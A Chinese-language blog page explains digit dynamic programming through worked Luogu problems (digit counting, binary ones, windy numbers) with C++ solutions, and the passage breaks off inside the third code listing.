<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Cascadia Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"deutschball.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"万一找到了呢","hits_empty":"你说的 ${query} 我怎么找不着呢 ","hits_stats":"找到了 ${hits} 个结果，用时 ${time} 毫秒"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="dustland">
<meta property="og:type" content="website">
<meta property="og:title" content="dustland">
<meta property="og:url" content="http://deutschball.github.io/impossible/page/3/index.html">
<meta property="og:site_name" content="dustland">
<meta property="og:description" content="dustland">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="dustball">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://deutschball.github.io/impossible/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>dustland</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">dustland</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">dustball in dustland</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container"></div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="algolia-results">
  <div id="algolia-stats"></div>
  <div id="algolia-hits"></div>
  <div id="algolia-pagination" class="algolia-pagination"></div>
</div>

      
    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/deutschball" class="github-corner" title="Follow me on GayHub" aria-label="Follow me on GayHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2023/01/04/%E6%95%B0%E4%BD%8DDP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/01/04/%E6%95%B0%E4%BD%8DDP/" class="post-title-link" itemprop="url">动态规划-数位DP</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-01-04 21:30:00 / Modified: 21:24:01" itemprop="dateCreated datePublished" datetime="2023-01-04T21:30:00+08:00">2023-01-04</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="数位dp">数位DP</h1>
<h2 id="p2602-数字计数"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P2602">P2602 数字计数</a></h2>
<p>给定正整数a,b,求<span
class="math inline">\([a,b]\)</span>所有的整数中,0到9每个数码各自总共出现多少次</p>
<p>由前缀和的思想,设<span class="math inline">\(sum[n]\)</span>表示<span
class="math inline">\([0,n]\)</span>中0到9各个数码各自出现了多少次</p>
<p>那么<span
class="math inline">\(sum[b]-sum[a-1]\)</span>就是所求值</p>
<p>问题转化为如何求<span class="math inline">\(sum[n]\)</span>即<span
class="math inline">\([0,n]\)</span>中0到9各个数码各自出现了多少次</p>
<p>设计状态<span
class="math inline">\(dp[i]\)</span>表示"当范围涵盖了完整的i位时,前i位中每个数字出现的次数."</p>
<blockquote>
<p>啥意思呢?</p>
<p>比如对于<span
class="math inline">\([1000,1999]\)</span>显然能够找出i=1的完整区间,比如<span
class="math inline">\([1000,1009]\)</span>等等</p>
<p>显然也能够找出i=2的完整区间,比如<span
class="math inline">\([1900,1999]\)</span>等等</p>
<p>显然也能够找出i=3的完整区间,比如<span
class="math inline">\([1000,1999]\)</span>,只有这一个</p>
<p>找不出i=4的完整区间了</p>
<p>如果对于[10,2000000],这就可以找到i=4的完整区间,也就是<strong>低四位能够遍历[0,9999]</strong>这个范围的区间,比如</p>
<p><span class="math inline">\([10000,19999]\)</span></p>
</blockquote>
<blockquote>
<p>这样设计dp有一个隐患就是,忽略了前导0的区别.比如给定区间[0,999],显然最大可以找到i=3的区间[0,999]</p>
<p>但是正常情况下,0不能作为前导,也就是说不能有012或001或000或020这种数字,可以有210或100这种数字</p>
<p>最后再考虑去除前导零的情况,现在先不考虑</p>
</blockquote>
<p>状态转移方程为: <span class="math display">\[
dp[i]=10\times dp[i-1]+10^{i-1}
\]</span> 如何考虑这个方程呢?排列组合问题</p>
<p>第i位假设放了一个X(先不管到底放了啥),考虑他对低i-1位的影响,</p>
<p>X有0,1,2,...,9十种可能,于是之前计算得到的dp[i-1]就得乘以10,</p>
<p>也就是说,1在低i-1上出现过<span class="math inline">\(10\times
dp[i-1]\)</span>次</p>
<p>okk,现在看低i-1位给第i位造成的影响,第i位假如放一个1,低i-1位随便放有<span
class="math inline">\(10^{i-1}\)</span>种放法</p>
<p>因此1就在第i位上出现过<span
class="math inline">\(10^{i-1}\)</span>次</p>
<blockquote>
<p>举个实际例子,以[0,999]为例,前导零的情况也计算在内</p>
<p><span
class="math inline">\(dp[1]=1\)</span>,边界条件,意思是区间为[0,9]的时候,一个数字显然只出现一次</p>
<p><span class="math inline">\(dp[2]=10\times
dp[1]+10^{1}=20\)</span></p>
<p>假设个位上放一个X,十位有十种可能,0X,1X,2X,3X,...,9X,也就是说,十位对个位计数的贡献就是<span
class="math inline">\(10\times dp[1]\)</span></p>
<p>假设十位上放一个X,个位有十种可能,X0,X1,X2,X3,...,X9.也就是说,个位对十位计数的贡献就是<span
class="math inline">\(10^{1}\)</span></p>
<blockquote>
<p>笑死,只有两位,要不你影响我,要不我影响你,怎么贡献方式还不一样?</p>
<p>再多一位就可以体现了</p>
</blockquote>
<p><span class="math inline">\(dp[3]=10\times
dp[2]+10^{2}=300\)</span></p>
<p>这时候发现貌似不容易计算百位对于前两位的贡献了,如何解释<span
class="math inline">\(10\times dp[2]\)</span>怎么来的呢?</p>
<p>可以这样想:</p>
<p>原来在计算<span
class="math inline">\(dp[2]\)</span>时,这样只有一个[0,99]区间,而考虑了百位之后,就有</p>
<p><span
class="math inline">\([0,99],[100,199],[200,299],...,[900,999]\)</span>这10个区间了,每个区间内数字的出现个数都是<span
class="math inline">\(dp[2]\)</span>现在有十个相同区间,因此当有三位的时候,从前两位计算得到的数字出现个数就是<span
class="math inline">\(10\times dp[2]\)</span></p>
<p>假设百位上放一个X,前两位稍微一动就是一个新数,X就得多记录一次</p>
<p>比如X23,X24,X25,这样百位上的X就记了3次.那么前两位一共有多少种可能的排列呢?<span
class="math inline">\(10^2\)</span>那么X在第三位上出现的次数就是<span
class="math inline">\(10^2\)</span></p>
</blockquote>
<p>然后考虑如何去除前导0</p>
<p>去除前导零,也就是给0的计数中去掉0出现在最高位的情况</p>
<p>去除前导0,<strong>只会对0的计数有影响,对其他数字没有影响</strong>,因为</p>
<p>012345去除前导0不是说把012345给去掉,而是保留12345,12345这五个数字各自统计一次,0此时不应计数</p>
<p>要去除i=6上的前导零计数,也就是去除</p>
<p>0XXXXX这种情况对0计数的贡献,显然有<span
class="math inline">\(10^5\)</span>种</p>
<p>去除i=5上的前导零计数,也就是去除</p>
<p>0XXXX这种情况对0计数的贡献,显然有<span
class="math inline">\(10^4\)</span>种</p>
<p>也就是去除第i位上的前导0影响,就是去除<span
class="math inline">\(10^{i-1}\)</span>次0的计数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">15</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> dp[maxn];</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> pow_10[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">solve</span><span class="params">(<span class="type">long</span> <span class="type">long</span> n)</span></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> temp=n;</span><br><span class="line">    <span class="type">int</span> length=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> top[maxn];</span><br><span class="line">    <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">result</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">    <span class="keyword">while</span>(n)&#123;</span><br><span class="line">        top[++length]=n%<span class="number">10</span>;</span><br><span class="line">        n/=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=length;i&gt;=<span class="number">1</span>;--i)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">10</span>;++j)&#123;</span><br><span class="line">            result[j]+=dp[i<span class="number">-1</span>]*top[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;top[i];++j)&#123;</span><br><span class="line">            result[j]+=pow_10[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        temp-=pow_10[i<span class="number">-1</span>]*top[i];</span><br><span class="line">        result[top[i]]+=temp<span class="number">+1</span>;</span><br><span class="line">        result[<span class="number">0</span>]-=pow_10[i<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> l,r;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;l&gt;&gt;r;</span><br><span class="line">    pow_10[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;maxn;++i)&#123;</span><br><span class="line">        dp[i]=dp[i<span class="number">-1</span>]*<span class="number">10</span>+pow_10[i<span class="number">-1</span>];</span><br><span class="line">        pow_10[i]=<span class="number">10</span>*pow_10[i<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;left=<span class="built_in">solve</span>(l<span class="number">-1</span>);</span><br><span class="line">    vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;right=<span class="built_in">solve</span>(r);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">9</span>;++i)&#123;</span><br><span class="line">        cout&lt;&lt;right[i]-left[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中比较抽象的是后面这个循环,他里面都干了什么呢?</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> j=<span class="number">0</span>;j&lt;<span class="number">10</span>;++j)result[j]+=dp[i<span class="number">-1</span>]*top[i];</span><br></pre></td></tr></table></figure>
<p>计算当前位i随便安排时,对前i位中,数位统计的贡献</p>
<p>使用<span class="math inline">\(top[i]\)</span>因为第i位上只有<span
class="math inline">\([0,top[i]-1]\)</span>共<span
class="math inline">\(top[i]\)</span>种情况</p>
<blockquote>
<p>为什么不是<span class="math inline">\([0,top[i]]\)</span>共<span
class="math inline">\(top[i]+1\)</span>种情况?假如对于<span
class="math inline">\([0,6524]\)</span></p>
<p>当前i=4,top[4]=6,可以找到区间[0,999],[1000,1999]</p>
<p>[2000,2999],[3000,3999],[4000,4999],[5000,5999]</p>
<p>共6个=top[4]</p>
<p>没有包括[6000,6999],因为最大到6524,即top[i]作为最高位时前i位找不出完整的区间来</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> j=<span class="number">0</span>;j&lt;top[i];++j)result[j]+=<span class="built_in">pow</span>(<span class="number">10</span>,i<span class="number">-1</span>); </span><br></pre></td></tr></table></figure>
<p>计算前i位随便安排时,对第i位数位统计的贡献</p>
<p>由于最高位上只可能出现<span
class="math inline">\([0,top[i]-1]\)</span>,再高top[i]没有完全区间,再高<span
class="math inline">\(top[i]+1\)</span>不可能出现,因此不能统计对<span
class="math inline">\([top[i],9]\)</span>这些数字的贡献</p>
<blockquote>
<p>比如当n=6524</p>
<p>i=6,也就是说存在1XXX,2XXX,3XXX,4XXX,5XXX这些完整区间(XXX表示[0,999])</p>
<p>6XXX没有完全区间,只有[6000,6524]</p>
<p>更不存在7XXX了</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">       </span><br><span class="line">temp-=<span class="built_in">pow</span>(<span class="number">10</span>,i<span class="number">-1</span>)*top[i];<span class="comment">//去掉最高位</span></span><br><span class="line">result[top[i]]+=temp<span class="number">+1</span>;<span class="comment">//之前统计贡献时,i位的最高数字总是不满区间,现在单独处理</span></span><br></pre></td></tr></table></figure>
<p>啥意思呢?还是n=6524举例子</p>
<p>temp=n=6524</p>
<p>然后temp=6524-6000=524</p>
<p>这524就是对top[4]=6统计次数的贡献,也就是6在i=4位上出现了524+1=525次</p>
<p>加一的原因是,524表示[0,524]共525种情况</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result[<span class="number">0</span>]-=<span class="built_in">pow</span>(<span class="number">10</span>,i<span class="number">-1</span>);<span class="comment">//去除前导零</span></span><br></pre></td></tr></table></figure>
<p>前导零有多种情况,比如0524,0024,0004,0000</p>
<p>这里每次只会处理一种情况,i=4时只会消除0999,0998,...,0000这种前导0.</p>
<h2 id="p8764-二进位问题"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P8764">P8764 二进位问题</a></h2>
<p><span
class="math inline">\([1,n]\)</span>这些整数中,二进制表示有k个1的有多少个</p>
<p>如果问题变成:m个二进制位,其中有k个1的有多少个数</p>
<p>显然是<span class="math inline">\(C_m^k\)</span></p>
<p>假设n表示成二进制形式之后,最高位是<span
class="math inline">\(bit[len]=1\)</span>,最低位是<span
class="math inline">\(bit[1]\)</span></p>
<p>显然前<span
class="math inline">\(len-1\)</span>位所有状态都包含在内了,因此首先有<span
class="math inline">\(C_{len-1}^k\)</span>,也就是最高位位0时,低<span
class="math inline">\(len-1\)</span>位任意安排</p>
<p>下面考虑最高位为1的情况,</p>
<p>从次高位<span
class="math inline">\(bit[len-1]\)</span>往低位bit[1]方向看</p>
<p>如果<span
class="math inline">\(bit[i]\)</span>为0则跳过,否则加上<span
class="math inline">\(C_{i-1}^{k-t}\)</span></p>
<p>其中t表示<span
class="math inline">\([i+1,len]\)</span>这些位上的1个数</p>
<p>比如<span class="math inline">\(n=101000,len=6\)</span></p>
<table>
<thead>
<tr>
<th>i</th>
<th>bit[i]</th>
<th>操作</th>
</tr>
</thead>
<tbody>
<tr>
<td>5</td>
<td>0</td>
<td>跳过</td>
</tr>
<tr>
<td>4</td>
<td>1</td>
<td><span class="math inline">\(+C_{4-1}^{k-1}\)</span></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>为啥加上这个数呢?第4位上有一个1,这表明存在</p>
<p><span
class="math inline">\([100000b,100111b]\)</span>,低三位存在完整区间,从这个完整区间中统计有<span
class="math inline">\(k-1\)</span>个1的数,是因为之前已经有一个1了,需要在剩下的位中找出k-1个1即可</p>
<p>现在的主要问题是如何快速求解<span
class="math inline">\(C_m^k\)</span></p>
<p><span class="math inline">\(C_m^0=1\)</span></p>
<p><span
class="math inline">\(C_m^k=C_{m-1}^{k-1}+C_{m-1}^k\)</span></p>
<p>用<span class="math inline">\(c[m][k]\)</span>数组预处理即可</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//c[m][k]</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxm=<span class="number">100</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxk=<span class="number">100</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> c[maxm][maxk];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// c[1][0]=c[1][1]=1;</span></span><br><span class="line">    c[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;maxm;i++)&#123;</span><br><span class="line">        c[i][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;i;++j)&#123;</span><br><span class="line">            c[i][j]=c[i<span class="number">-1</span>][j<span class="number">-1</span>]+c[i<span class="number">-1</span>][j];</span><br><span class="line">        &#125;</span><br><span class="line">        c[i][i]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">20</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=i;j++)&#123;</span><br><span class="line">            cout&lt;&lt;c[i][j]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> n;</span><br><span class="line"><span class="type">int</span> k;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> bit[maxm];</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> len;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> temp=n;</span><br><span class="line">    <span class="keyword">while</span>(temp)&#123;</span><br><span class="line">        bit[++len]=temp&amp;<span class="number">1</span>;</span><br><span class="line">        temp&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> result=<span class="number">0</span>;</span><br><span class="line">    result+=c[len<span class="number">-1</span>][k];</span><br><span class="line">    <span class="type">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=len<span class="number">-1</span>;i&gt;=<span class="number">1</span>;--i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(bit[i]==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(k-t&lt;<span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">        result+=c[i<span class="number">-1</span>][k-t];</span><br><span class="line">        ++t;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;result&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="p2657-windy数"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P2657">P2657 windy数</a></h2>
<p>定义windy数:相邻两个十进制位必须至少差2,比如135,2597等等</p>
<p>给定区间[l,r]求这之间的windy数有多少</p>
<p>问题转化为[1,n]中的windy数有多少</p>
<p>设计状态: <span class="math display">\[
dp[i][j]表示i个10进制位,最高位第i位上是j的windy数的个数
\]</span> 边界条件显然是只有一位的时候,<span
class="math inline">\(dp[1][j]=1\)</span></p>
<p>转移方程: <span class="math display">\[
dp[i][j]=\sum_{|k-j|\ge2}dp[i-1][k]
\]</span></p>
<p>下面考虑[1,n]中有多少windy数</p>
<p>首先划分成十进位</p>
<p>dec[len],dec[len-1],...,dec[1],最高位是dec[len]</p>
<p>那么显然有低len-1位的完整区间,全算上</p>
<p>第len位上,从1到dec[len]-1这些<code>dp[len][i]</code>也是都有的</p>
<p>只剩下len位上放dec[len]的情况了,这是最贴近上边界的情况,如何考虑?</p>
<p>i从len-1往1遍历</p>
<p>对于当前位i,尝试放置<span class="math inline">\(0\le
j&lt;dec[i]\)</span>,因为第i位最高可以为dec[i],比他小的数都存在</p>
<p>然后判断j是否合法,依据就是j和dec[i+1]距离是否大于等于2,</p>
<p>如果是,则加上<span class="math inline">\(dp[i][j]\)</span></p>
<p>这样第i位就统计完毕,尝试往更低位统计,第i位最终放置的是dec[i]</p>
<p>如果dec[i+1]和dec[i]相差小于2,就不能继续往低位统计了</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 